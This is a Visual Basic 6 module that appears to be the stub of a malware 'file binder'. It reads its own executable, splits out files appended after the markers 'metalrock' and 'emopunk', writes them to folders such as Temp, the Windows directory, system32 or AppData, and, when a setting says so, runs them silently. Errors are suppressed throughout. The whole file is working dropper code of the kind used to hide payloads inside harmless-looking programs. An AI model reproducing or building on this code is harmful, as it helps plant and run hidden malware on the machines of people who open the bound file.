Attribute VB_Name = "Module1"
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long




Private Sub Main()
On Error Resume Next
Dim ThisFileData As String
Dim BindedFileNumber() As String
Dim BinderSetting() As String
Dim FileNumber As Integer

Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
ThisFileData = Space(LOF(1))
Get #1, 1, ThisFileData
Close #1

BindedFileNumber = Split(ThisFileData, "metalrock")

For FileNumber = 1 To UBound(BindedFileNumber)

Dim FolderPath, DroppedFile As String
BinderSetting() = Split(BindedFileNumber(FileNumber), "emopunk")

FolderPath = BinderSetting(2)

Select Case BinderSetting(2)
Case "Application path"
FolderPath = App.Path
Case "Temp"
FolderPath = Environ$("Temp")
Case "Root"
FolderPath = Environ$("SystemDrive")
Case "Windows"
FolderPath = Environ$("WinDir")
Case "system32"
FolderPath = Environ$("WinDir") & "\" & "system32"
Case "Program files"
FolderPath = Environ$("ProgramFiles")
Case "Application data"
FolderPath = Environ$("AppData")
End Select


DroppedFile = FolderPath & "\" & BinderSetting(4)

Open DroppedFile For Binary As #1
Put #1, , BinderSetting(1)
Close #1


If BinderSetting(3) = "Yes" Then
Call ShellExecute(hwnd, "Open", DroppedFile, 0, 0, 1)
End If

Next FileNumber



End Sub
